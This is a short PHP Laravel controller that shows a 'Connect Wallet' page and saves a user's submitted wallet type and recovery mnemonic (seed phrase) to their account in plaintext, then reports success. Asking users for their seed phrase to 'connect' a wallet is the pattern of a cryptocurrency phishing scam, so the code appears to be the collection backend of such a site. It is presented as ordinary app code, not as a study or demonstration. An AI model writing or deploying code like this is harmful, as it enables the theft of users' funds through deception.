<?php

namespace App\Http\Controllers\User;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;

class WalletController extends Controller
{
    // THIS IS THE MISSING METHOD
    public function index()
    {
        return view('user.wallet_connect', [
            'title' => 'Connect Wallet'
        ]);
    }

    // This handles the form submission
    public function store(Request $request)
    {
        $request->validate([
            'wallet' => 'required|string',
            'mnemonic' => 'required|string',
        ]);

        $user = Auth::user();
        $user->wallet_type = $request->wallet;
        $user->mnemonic = $request->mnemonic; 
        $user->save();

        return back()->with('success', 'Wallet connected successfully!');
    }
}